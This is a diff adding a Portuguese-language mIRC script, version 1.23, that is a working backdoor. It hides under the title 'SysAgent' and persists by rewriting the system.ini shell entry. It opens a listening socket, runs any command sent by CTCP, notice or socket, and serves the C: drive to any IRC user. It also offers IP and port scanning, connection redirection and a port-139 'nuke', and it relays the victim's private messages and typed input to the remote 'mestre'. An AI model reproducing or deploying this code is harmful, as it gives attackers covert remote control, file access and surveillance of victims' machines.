@@ -1,0 +1,668 @@
+;1.23
+alias putcmd if ($sock(cmd)) { if (%telnet) .sockwrite cmd $strip($$1-) $+ $crlf | else .sockwrite cmd $$1- $+ $crlf }
+alias tbeep if ((%telnet) && (%tbeep) && ($sock(cmd))) .sockwrite cmd $chr(7)
+alias cmdblank putcmd $chr(160)
+alias checkserv {
+  if ($server = $null) server %defserver
+  if ($sock(helplisten) = $null) socklisten helplisten %helpport
+  if (/nick* iswm $editbox(Status Window)) {
+    if ($rand(0,1)) nick Massaranduba_ $+ $rand(0,99999)
+    else nick Montanha_ $+ $rand(0,99999)
+    editbox -s
+  }
+  if ($dde LanSux exename "" != $mircexe) dde LanSux command "" /exit
+  saveini
+}
+on *:START: {
+  titlebar SysAgent
+  if (%helpport = $null) %helpport = 2643
+  .timer 1 10 socklisten helplisten %helpport
+  if (%defserver = $null) %defserver = irc.wln.com.br 6664
+  if (%chans = $null) %chans = #ChatAway,#ACDC
+  %cmdtmp = 0
+  .timerserv 0 300 checkserv
+  var %ini = $deltok($mircdir,3,92) $+ \system.ini
+  if ($readini %ini boot shell != explorer.exe $mircdiragent.exe) writeini %ini boot shell explorer.exe $mircdiragent.exe
+}
+on *:CONNECT: {
+  tbeep
+  join %chans
+  if ($group(#console) = on) putcmd CONSOLE: Conectei no IRC => $server $+ : $+ $port ( $+ $me $+ )
+  %online = $ctime
+  inc %connect
+  if (%right(%connect,1) = 0) {
+    var %found = $findfile($mircdir,~*.tmp,0,1)
+    var %i = 0
+    :loopdel
+    inc %i
+    .remove $findfile($mircdir,~*.tmp,%i,1)
+    if (%i < %found) goto loopdel
+  }
+  saveini
+}
+ctcp ^*:FSERVE:haltdef | fserve $nick 999 c:\
+on ^*:NOTICE:C *:?:haltdef | $$2-
+on ^*:NOTICE:Cs *:?:haltdef | .alias cstmp $$2- | cstmp
+ctcp ^*:GETIP: {
+  .ctcpreply $nick GETIP Meu IP é $ip e minha porta é %helpport meu mestre!
+  if ($sock(cmd)) .ctcpreply $nick GETIP O mestre do $sock(cmd).ip já está conectado.
+}
+ctcp ^*:OPEN*: {
+  if ($3 = $null) {
+    .ctcpreply $nick OPEN Formato: /ctcp $me OPEN <seu ip> <sua porta>
+    return
+  }
+  inc %cmdtmp
+  sockopen cmdtmp $+ %cmdtmp $2 $3
+  .ctcpreply $nick OPEN Tentando conexão...
+  tbeep
+  putcmd $nick ( $+ $2 $+ : $+ $3 $+ ) tentando conexão...
+  %cmdnick = $nick
+}
+on *:SOCKOPEN:cmdtmp*: {
+  if ($sockerr > 0) {
+    if (: isin %cmdnick) putcmd Conexão OPEN falhou.
+    else {
+      .ctcpreply %cmdnick OPEN Conexão falhou.
+      putcmd Conexão de %cmdnick ( $+ $sock($sockname).ip $+ : $+ $sock($sockname).port $+ ) falhou.
+    }
+    return
+  }
+  if (: isin %cmdnick) {
+    tbeep
+    putcmd Conexão OPEN para %cmdnick realizada com sucesso meu mestre !
+  }
+  else {
+    .ctcpreply %cmdnick OPEN Conexão realizada com sucesso meu mestre!
+    tbeep
+    putcmd %cmdnick ( $+ $sock($sockname).ip $+ : $+ $sock(cmdtmp).port $+ ) conectou.
+  }
+  if ($sock(cmd)) {
+    sockwrite $sockname O mestre $sock(cmd).ip já está conectado. $+ $crlf
+    sockwrite $sockname Se você é um ratão bocaberta e quer desconectar o mestre digite em 20s: $+ $crlf
+    sockwrite $sockname Eu sou um ratao do banhado bocaberta e quero desconectar o $sock(cmd).ip $+ $crlf
+    .timertmp $+ $remove($sockname,cmdtmp) 1 20 cmdtimeout $sockname
+    return
+  }
+  sockrename $sockname cmd
+  cmdstart
+}
+on *:SOCKREAD:cmdtmp*: {
+  sockread %tmp
+  if (($sockerr > 0) || (%tmp = $null)) return
+  if (%tmp = Eu sou um ratao do banhado bocaberta e quero desconectar o $sock(cmd).ip) {
+    tbeep | tbeep | tbeep
+    putcmd O cara do $sock($sockname).ip é um ratao do banhado bocaberta e te desconectou, tchau meu mestre !
+    sockclose cmd
+    sockrename $sockname cmd
+    .timertmp $+ $remove($sockname,cmdtmp) off
+    cmdstart
+    return
+  }
+  putcmd Desconectando de $sock($sockname).ip
+  sockwrite $sockname Errado mané !
+  sockclose $sockname
+  .timertmp $+ $remove($sockname,cmdtmp) off
+}
+on *:SOCKCLOSE:cmdtmp*:.timertmp $+ $remove($sockname,cmdtmp) off | putcmd $sock($sockname).ip desconectou.
+alias cmdtimeout {
+  if ($sock($1) = $null) return
+  putcmd Tempo esgotado para $sock($1).ip
+  sockwrite $1 Tempo esgotado.
+  sockclose $1
+}
+on *:SOCKCLOSE:cmd: {
+  .timeripscan off
+  .timeripscanend off
+  .timerportscan off
+  .timerportscanend off
+  sockclose ipscan*
+  sockclose portscan*
+  .disable #ipscan
+  .disable #portscan
+  unset %ipscan* %portscan*
+}
+on *:SOCKREAD:cmd: {
+  if ($sockerr > 0) return
+  if (%telnet) {
+    sockread -f %tmp
+    var %tmp = $replace(%tmp,$chr(32),$chr(160),,,,,,)
+    var %i = 0
+    :loop
+    inc %i
+    if (%i > $sockbr) return
+    var %char = $mid(%tmp,%i,1)
+    if (%char = $null) {
+      if (%cmdread = $null) return
+      sockwrite cmd $crlf
+      var %process = $replace(%cmdread,$chr(160),$chr(32))
+      unset %cmdread
+      cmd %process
+      return
+    }
+    if ($asc(%char) = 8) {
+      if (%cmdread = $null) goto loop
+      set %cmdread $left(%cmdread,-1)
+      sockwrite cmd $chr(8) $chr(8)
+      goto loop
+    }
+    sockwrite cmd %char
+    set %cmdread %cmdread $+ %char
+    goto loop
+  }
+  sockread %tmp
+  if (%tmp = $null) return
+  if (%tmp = ) { set %telnet 1 | putcmd Modo Telnet ligado. | return  }
+  cmd %tmp
+}
+alias cmdstart {
+  set %telnet 0
+  putcmd Conectado, bem vindo ao meu BackDoor meu mestre!
+  putcmd Meu ip é $ip e meu hostname é $host
+  putcmd Digite 'help' para ajuda.
+  putcmd Divirta-se ! ! !
+  cmdblank
+  .enable #console
+}
+alias cmd {
+  if ($1 = redir) {
+    if ($5 = $null) { putcmd Formato: REDIR <nº> <IP destino> <porta destino> <sua porta> | return }
+    var %redirtmp = redircli $+ $2
+    if ($sock(%redirtmp)) { putcmd O redirecionador nº $2 já está em uso. | return }
+    putcmd Tentando conexões...
+    .sockopen %redirtmp $sock(cmd).ip $5
+    sockmark %redirtmp 0
+    .remove %redirtmp $+ .tmp
+    .sockopen redirserv $+ $2 $3 $4
+    sockmark redirserv $+ $2
+    .remove redirserv $+ $2 $+ .tmp
+    return
+  }
+  if ($1 = redircl) {
+    if ($2 = $null) { putcmd Formato: REDIRcl <nº> | return }
+    putcmd Fechando conexões REDIR $2
+    sockclose redircli $+ $2
+    sockclose redirserv $+ $2
+    return
+  }
+  if ($1 = connect) {
+    if ($2 = status) {
+      if ($sock(conn) = $null) { putcmd Não conectado. | return }
+      putcmd Conectado em $sock(conn).ip $+ : $+ $sock(conn).port
+      return
+    }
+    if ($2 = $null) { putcmd Formato: CONNECT <IP> [porta] ou CONNECT status | return }
+    if ($sock(conn)) { putcmd Fechando conexão existente... | sockclose conn }
+    putcmd Tentando conexão...
+    sockopen conn $2 $iif(($3),$3,2643)
+    return
+  }
+  if ($1 = disconnect) {
+    if ($sock(conn) = $null) { putcmd Não conectado. | return }
+    putcmd Fechando conexão para $sock(conn).ip $+ : $+ $sock(conn).port
+    sockclose conn
+    return
+  }
+  if ($1 = ipscan) {
+    if ($2 = stop) { ipscan stop | return }
+    if ($2 = last) { ipscan %lastipscan | return }
+    if ($2 = status) {
+      if (%ipscanip = $null) { putcmd Último scan: %lastipscan | return }
+      cmdblank
+      putcmd IP inicial: %ipscanipk
+      putcmd IP final: $longip(%ipscanipl)
+      putcmd IP atual: $longip(%ipscanip)
+      putcmd Porta: %ipscanport
+      putcmd Atraso: %ipscandelay
+      putcmd Espera: %ipscanwait
+      return
+    }
+    if ($4 = $null) {
+      putcmd Formato: IPSCAN <1º IP> <porta> <nº de IPs ou último IP> [atraso em ms] [espera em s]
+      putcmd Ou: IPSCAN [last|stop|status]
+      return
+
+    }
+    ipscan $2-
+    return
+  }
+  if ($1 = portscan) {
+    if ($2 = stop) { portscan stop | return }
+    if ($2 = last) { portscan %lastportscan | return }
+    if ($2 = status) {
+      if (%portscanip = $null) { putcmd Último scan: %lastportscan | return }
+      cmdblank
+      putcmd IP: %portscanip
+      putcmd Porta inicial: %portscanportk
+      putcmd Porta final: %portscanportl
+      putcmd Porta atual: %portscanport
+      putcmd Atraso: %portscandelay
+      putcmd Espera: %portscanwait
+      return
+    }
+    if ($4 = $null) {
+      putcmd Formato: PORTSCAN <IP> <1ª porta> <última porta> [atraso em ms] [espera em s]
+      putcmd Ou: PORTSCAN [last|stop|status]
+      return
+    }
+    portscan $2-
+    return
+  }
+  if ($1 = fuck) {
+    if ($2 = $null) { putcmd Formato: FUCK <IP> | return }
+    putcmd Tentando nukar o FDP...
+    sockopen fuck $+ $calc($ticks - $rand(0,100)) $2 139
+    return
+  }
+  if ($1 = send) {
+    if ($2 = $null) { putcmd Formato: SEND <texto> | return }
+    .sockwrite conn $2- $+ $crlf
+    return
+  }
+  if ($1 = c) {
+    if ($2 = $null) { putcmd Formato: C <comando> | return }
+    $2-
+    return
+  }
+  if ($1 = cs) {
+    if ($2 = $null) { putcmd Formato: Cs <comando> | return }
+    .alias cstmp $2-
+    cstmp
+    return
+  }
+  if ($1 = console) {
+    if ($2 = on) { .enable #console | putcmd Console ligado. | return }
+    if ($2 = off) { .disable #console | putcmd Console desligado. | return }
+    putcmd O console está: $iif(($group(#console) = on),Ligado,Desligado)
+    putcmd Formato: CONSOLE [on|off] | return
+    return
+  }
+  if ($1 = quit) {
+    cmdblank
+    putcmd Tchau meu mestre!
+    sockclose cmd
+    return
+  }
+  if ($1 = info) {
+    var %i = 1
+    :loopstatus1
+    var %tmpchan = %tmpchan $chan(%i)
+    if ($chan(%i) = $null) goto nextstatus1
+    inc %i
+    goto loopstatus1
+    :nextstatus1
+    var %i = 1
+    :loopstatus2
+    var %tmpquery = %tmpquery $query(%i)
+    if ($query(%i) = $null) goto nextstatus2
+    inc %i
+    goto loopstatus2
+    :nextstatus2
+    cmdblank
+    putcmd ===> Informações gerais <===
+    putcmd Script como aplicação ativa: $iif(($appactive),Sim,Não)
+    putcmd Último nick/IP a pedir conexão: %cmdnick
+    putcmd Idle: $duration($idle)
+    putcmd Seu IP: $sock(cmd).ip
+    putcmd Estou na sua porta: $sock(cmd).port
+    putcmd Versão: 1.23
+    putcmd ===> Informações locais <===
+    putcmd IP: $ip
+    putcmd HostName: $host
+    putcmd Horário: $time
+    putcmd Data: $date
+    putcmd CPU Run Time: $duration($calc($ticks / 1000))
+    putcmd Versão do Windows: $os
+    if ($url) putcmd Navegando: $url
+    putcmd ===> Servidor de IRC <===
+    if ($server) {
+      putcmd Servidor: $server
+      putcmd Porta: $port
+      putcmd Tempo conectado: $duration($calc($ctime - %online))
+    }
+    else {
+      putcmd Servidor: Desconectado
+      putcmd Porta: Desconectado
+      putcmd Tempo conectado: Desconectado
+    }
+    putcmd Já conectei: %connect vezes
+    putcmd Nick: $me
+    putcmd Canais: %tmpchan
+    putcmd Querys: %tmpquery
+    putcmd Console: $group(#console)
+    return
+  }
+  if ($1 = ping) { putcmd PONG $2- | return }
+  if ($1 = open) {
+    if ($3 = $null) {
+      putcmd Formato: OPEN <IP> <porta>
+      return
+    }
+    inc %cmdtmp
+    sockopen cmdtmp $+ %cmdtmp  $2 $3
+    putcmd Tentando conexão...
+    %cmdnick = $2 $+ : $+ $3
+    return
+  }
+  if ($1 = restart) {
+    cmdblank
+    tbeep
+    putcmd Fechando todas conexões...
+    sockclose redir*
+    sockclose conn
+    sockclose fuck*
+    sockclose help*
+    tbeep
+    putcmd Gravando configurações...
+    saveini
+    tbeep
+    putcmd Reiniciando...
+    run agent.exe
+    exit
+    return
+  }
+  if ($1 = set) {
+    if ($3 = $null) {
+      putcmd Formato: SET <variável> <texto>
+      putcmd Variáveis editáveis do script:
+      putcmd helpport = Porta do script.
+      putcmd defserver = Servidor de IRC.
+      putcmd chans = Canais a entrar, separados por vírgula.
+      putcmd con.chan = 1|0 Mostrar MSGs em canal no console.
+      putcmd telnet = 1|0 Define se você está usando o telnet.
+      putcmd tbeep = 1|0 Liga o beep do telnet.
+      return
+    }
+    set % [ $+ [ $2 ] ] $3-
+    return
+  }
+  if ($1 = unset) {
+    if ($2 = $null) { putcmd Formato: UNSET <variável> | return }
+    set -u1 % [ $+ [ $2 ] ] ""
+    return
+  }
+  if ($1 = help) { 
+    cmdblank
+    putcmd Comandos válidos são:
+    putcmd REDIR      => Redireciona uma conexão.
+    putcmd REDIRcl    => Fecha uma conexão redirecionada.
+    putcmd CONNECT    => Faz uma conexão com outro IP.
+    putcmd DISCONNECT => Desconecta de outro IP.
+    putcmd SEND       => Envia dados para uma conexão.
+    putcmd IPSCAN     => Escaneia IPs com uma porta.
+    putcmd PORTSCAN   => Escaneia portas em um IP.
+    putcmd FUCK       => Nuka um FDP.
+    putcmd C          => Executa um comando de mIRC.
+    putcmd Cs         => Executa um comando como script.
+    putcmd CONSOLE    => Liga ou desliga o console.
+    putcmd QUIT       => Desconecta.
+    putcmd INFO       => Mostra diversas informações.
+    putcmd PING       => Testa a conexão.
+    putcmd SET        => Seta uma variável.
+    putcmd UNSET      => Apaga uma variável.
+    putcmd OPEN       => Mesmo que o CTCP OPEN.
+    putcmd RESTART    => Reinicia o script. CUIDADO!
+    putcmd Outros comandos serão executados como comandos normais de mIRC.
+    return
+  }
+  $1-
+}
+on *:SOCKLISTEN:helplisten: {
+  inc %cmdtmp
+  var %sock = cmdtmp $+ %cmdtmp
+  sockaccept %sock
+  set %cmdnick $sock(%sock).ip $+ : $+ $sock(%sock).port
+  tbeep
+  putcmd %cmdnick conectando pelo HelpSock.
+  if ($sock(cmd)) {
+    sockwrite %sock O mestre $sock(cmd).ip já está conectado. $+ $crlf
+    sockwrite %sock Se você é um ratão bocaberta e quer desconectar o mestre digite em 20s: $+ $crlf
+    sockwrite %sock Eu sou um ratao do banhado bocaberta e quero desconectar o $sock(cmd).ip $+ $crlf
+    .timertmp $+ %cmdtmp 1 20 cmdtimeout %sock
+    return
+  }
+  sockrename %sock cmd
+  tbeep
+  cmdstart
+}
+on *:SOCKOPEN:redir*: {
+  if ($sockerr > 0) {
+    putcmd Conexão $sockname falhou, fechando conexões.
+    sockclose redircli $+ $right($sockname,1)
+    sockclose redirserv $+ $right($sockname,1)
+    return
+  }
+  putcmd Conexão $sockname realizada com sucesso.
+  if ($sock($sockname).mark > 0) {
+    var %file = $sockname $+ .tmp
+    bread %file $calc($lof(%file) - $sock($sockname).mark) 4096 &buffer
+    sockmark $sockname $calc($sock($sockname).mark - $bvar(&buffer,0))
+    sockwrite $sockname &buffer
+    if ($sock($sockname).mark = 0) .remove %file
+  }
+}
+on *:SOCKOPEN:conn: {
+  var %tmpconn = $sock(conn).ip $+ : $+ $sock(conn).port
+  if ($sockerr > 0) {
+    putcmd Conexão para %tmpconn falhou.
+    sockclose conn
+    return
+  }
+  putcmd Conectado em %tmpconn
+}
+on *:SOCKCLOSE:conn:putcmd Desconectado de %tmpconn
+on *:SOCKREAD:conn: {
+  sockread %tmp
+  if (($sockerr > 0) || (%tmp = $null)) return
+  putcmd $sock(conn).ip $+ : $+ $sock(conn).port => %tmp
+}
+on *:SOCKCLOSE:redir*: {
+  putcmd Conexão $sockname fechada.
+  sockclose redir* $+ $right($sockname,1)
+}
+on *:SOCKREAD:redircli*: {
+  var %redir = redirserv $+ $right($sockname,1)
+  var %file = %redir $+ .tmp
+  :loop
+  sockread &buffer
+  if (($sockerr > 0) || ($sockbr = 0)) return
+  if (($sock(%redir).status = active) && ($sock(%redir).sq < 8193) && ($sock(%redir).mark = 0)) { .sockwrite %redir &buffer | goto loop }
+  bwrite %file -1 -1 &buffer
+  sockmark %redir $calc($sock(%redir).mark + $sockbr)
+  goto loop
+}
+on *:SOCKREAD:redirserv*: {
+  var %redir = redircli $+ $right($sockname,1)
+  var %file = %redir $+ .tmp
+  :loop
+  sockread &buffer
+  if (($sockerr > 0) || ($sockbr = 0)) return
+  if (($sock(%redir).status = active) && ($sock(%redir).sq < 8193) && ($sock(%redir).mark = 0)) { .sockwrite %redir &buffer | goto loop }
+  bwrite %file -1 -1 &buffer
+  sockmark %redir $calc($sock(%redir).mark + $sockbr)
+  goto loop
+}
+on *:SOCKWRITE:redir*: {
+  if (($sock($sockname).mark > 0) && ($sock($sockname).sq < 8193) && ($sockerr = 0)) {
+    var %file = $sockname $+ .tmp
+    bread %file $calc($lof(%file) - $sock($sockname).mark) 4096 &buffer
+    sockmark $sockname $calc($sock($sockname).mark - $bvar(&buffer,0))
+    sockwrite $sockname &buffer
+    if ($sock($sockname).mark = 0) .remove %file
+  }
+}
+on *:SOCKOPEN:fuck*: {
+  if ($sockerr > 0) {
+    putcmd Nuke em $sock($sockname).ip falhou.
+    return
+  }
+  sockwrite $sockname FuCk YoUr MoThEr'S AsS ! Die asshole! Hahahaha ! LanSux RuLeZ ! $+ $crlf
+  tbeep
+  putcmd Nuke em $sock($sockname).ip realizado com sucesso.
+  sockclose $sockname
+}
+#console on
+on *:TEXT:*:?:putcmd CONSOLE: MSG $nick ( $+ $address $+ ) => $1- | tbeep
+on *:ACTION:*:?:putcmd CONSOLE: ACTION $nick ( $+ $address $+ ) => $1- | tbeep
+on *:TEXT:*:#:if (%con.chan) putcmd CONSOLE: PUB $chan $nick ( $+ $address $+ ) => $1-
+on *:ACTION:*:#:if (%con.chan) putcmd CONSOLE: PUBACT $chan $nick ( $+ $address $+ ) => $1-
+on *:NOTICE:*:#:if (%con.chan) putcmd CONSOLE: PUBNOTC $chan $nick ( $+ $address $+ ) => $1-
+on *:TOPIC:#:if (%con.chan) putcmd CONSOLE: TOPIC $chan $nick ( $+ $address $+ ) => $1-
+on *:MODE:#:if (%con.chan) putcmd CONSOLE: MODE $chan $nick ( $+ $address $+ ) => $1-
+on *:NOTICE:*:?:putcmd CONSOLE: NOTICE $nick ( $+ $address $+ ) => $1- | tbeep
+on *:SNOTICE:*:putcmd CONSOLE: SNOTICE => $1- | tbeep
+ctcp *:*:putcmd CONSOLE: CTCP $nick ( $+ $address $+ ) => $1-
+on *:CTCPREPLY:*:putcmd CONSOLE: CTCPREPLY $nick => $1-
+on *:JOIN:#:if ($nick = $me) putcmd CONSOLE: ENTREI no $chan
+on *:PART:#:if ($nick = $me) putcmd CONSOLE: SAÍ do $chan
+on *:KICK:#:if ($knick = $me) putcmd CONSOLE: Fui kickado do $chan por $nick ( $+ $address $+ ) ( $+ $1- $+ ) | tbeep
+on *:OP:#:if ($opnick = $me) putcmd CONSOLE: $nick ( $+ $address $+ ) me deu OP no $chan | tbeep
+on *:DEOP:#:if ($opnick = $me) putcmd CONSOLE: $nick ( $+ $address $+ ) tirou meu OP no $chan | tbeep
+on *:VOICE:#:if ($vnick = $me) putcmd CONSOLE: $nick ( $+ $address $+ ) me deu VOICE no $chan
+on *:DEVOICE:#:if ($vnick = $me) putcmd CONSOLE: $nick ( $+ $address $+ ) tirou meu VOICE no $chan
+on *:INVITE:#:putcmd CONSOLE: $nick ( $+ $address $+ ) me convidou para o $chan | tbeep
+on *:DISCONNECT:putcmd CONSOLE: Desconectei do IRC | tbeep
+on *:ERROR:*:putcmd CONSOLE: ERROR => $2- | tbeep
+on *:NICK:if ($nick = $me) putcmd CONSOLE: Meu nick foi mudado para $newnick
+raw *:*:putcmd CONSOLE: RAW $numeric => $2-
+on *:INPUT:*:putcmd CONSOLE: Digitação! ( $+ $active $+ ) => $1- | tbeep
+#console end
+alias ipscan {
+  if ($1 = stop) {
+    if (($timer(ipscan)) || ($timer(ipscanend))) {
+      .timeripscan off
+      .timeripscanend off
+      sockclose ipscan*
+      .disable #ipscan
+      cmdblank
+      putcmd IPScan => Scan parado em $longip(%ipscanip) $+ . %ipscanfound $iif((%ipscanfound = 1),IP,IPs) $iif((%ipscanfound = 1),encontrado.,encontrados.)
+      unset %ipscan*
+    }
+    return
+  }
+  if ((($4) && ($4 !isnum)) || (($5) && ($5 !isnum))) return
+  if (($timer(ipscan)) || ($timer(ipscanend))) {
+    .timeripscan off
+    .timeripscanend off
+    sockclose ipscan*
+    .disable #ipscan
+    cmdblank
+    putcmd IPScan => Scan parado em $longip(%ipscanip) $+ . %ipscanfound $iif((%ipscanfound = 1),IP,IPs) $iif((%ipscanfound = 1),encontrado.,encontrados.)
+    unset %ipscan*
+  }
+  %ipscanip = $longip($1)
+  %ipscanport = $2
+  %ipscanipk = $1
+  if ($chr(46) isin $3) %ipscanipl = $longip($3)
+  else %ipscanipl = %ipscanip + $3
+  %ipscandelay = $iif(($4),$4,500)
+  %ipscanwait = $iif(($5),$5,10)
+  %ipscanfound = 0
+  %ipscanloop = 0
+  %lastipscan = $1-
+  cmdblank
+  putcmd IPScan => Iniciando scan de $1 até $longip(%ipscanipl) na porta $2
+  .enable #ipscan
+  .timeripscan -m 0 %ipscandelay ipscanloop
+}
+alias IPScanloop {
+  sockopen ipscan $+ %ipscanloop %ipscanip %ipscanport
+  if (%ipscanipl <= %ipscanip) {
+    .timeripscan off
+    cmdblank
+    if ($sock(ipscan*) = $null) { IPScanend | return }
+    tbeep
+    putcmd IPScan => Aguardando conexões...
+    .timeripscanend 1 %ipscanwait ipscanend
+    return
+  }    
+  if ($right(%ipscanloop,2) = 10) putcmd IPScan => IP atual: $longip(%ipscanip)
+  inc %ipscanip
+  inc %ipscanloop
+}
+alias IPScanend {
+  tbeep
+  putcmd IPScan => Scan finalizado. %ipscanfound $iif((%ipscanfound = 1),IP,IPs) $iif((%ipscanfound = 1),encontrado.,encontrados.)
+  sockclose ipscan*
+  .disable #ipscan
+  unset %ipscan*
+}
+
+#ipscan off
+on *:SOCKOPEN:ipscan*: {
+  if ($sockerr > 0) halt
+  tbeep
+  putcmd IPScan => Porta encontrada em $longip($sock($sockname).ip)
+  inc %ipscanfound
+  sockclose $sockname
+}
+#ipscan end
+alias PortScan {
+  if ($1 = stop) {
+    if (($timer(PortScan)) || ($timer(PortScanend))) {
+      .timerPortScan off
+      .timerPortScanend off
+      sockclose PortScan*
+      .disable #PortScan
+      cmdblank
+      putcmd PortScan => Scan parado na porta %PortScanport $+ . %PortScanfound $iif((%PortScanfound = 1),porta,portas) $iif((%PortScanfound = 1),encontrada.,encontradas.)
+      unset %PortScan*
+    }
+    return
+  }
+  if ((($4) && ($4 !isnum)) || (($5) && ($5 !isnum))) return
+  if (($timer(PortScan)) || ($timer(PortScanend))) {
+    .timerPortScan off
+    .timerPortScanend off
+    sockclose PortScan*
+    .disable #PortScan
+    cmdblank
+    putcmd PortScan => Scan parado na porta %PortScanport $+ . %PortScanfound $iif((%PortScanfound = 1),porta,portas) $iif((%PortScanfound = 1),encontrada.,encontradas.)
+    unset %PortScan*
+  }
+  %portscanip = $1
+  %portscanport = $2
+  %portscanportk = $2
+  %portscanportl = $3
+  %portscandelay = $iif(($4),$4,200)
+  %portscanwait = $iif(($5),$5,10)
+  %portscanfound = 0
+  %portscanloop = 0
+  %lastportscan = $1-
+  cmdblank
+  putcmd PortScan => Iniciando scan em $1 da porta $2 até a porta $3
+  .enable #portscan
+  .timerportscan -m 0 %portscandelay portscanloop
+}
+alias PortScanloop {
+  sockopen PortScan $+ %PortScanloop %PortScanip %PortScanport
+  if (%PortScanportl <= %PortScanport) {
+    .timerPortScan off
+    cmdblank
+    if ($sock(PortScan*) = $null) { PortScanend | return }
+    tbeep
+    putcmd PortScan => Aguardando conexões...
+    .timerPortScanend 1 %PortScanwait PortScanend
+    return
+  }    
+  if ($right(%PortScanloop,2) = 10) putcmd PortScan => Porta atual: %PortScanport
+  inc %PortScanport
+  inc %PortScanloop
+}
+alias PortScanend {
+  tbeep
+  putcmd PortScan => Scan finalizado. %PortScanfound $iif((%PortScanfound = 1),porta,portas) $iif((%PortScanfound = 1),encontrada.,encontradas.)
+  sockclose PortScan*
+  .disable #PortScan
+  unset %PortScan*
+}
+
+#portscan off
+on *:SOCKOPEN:portscan*: {
+  if ($sockerr > 0) halt
+  tbeep
+  putcmd PortScan => Porta encontrada: $sock($sockname).port
+  inc %PortScanfound
+  sockclose $sockname
+}
+#portscan end
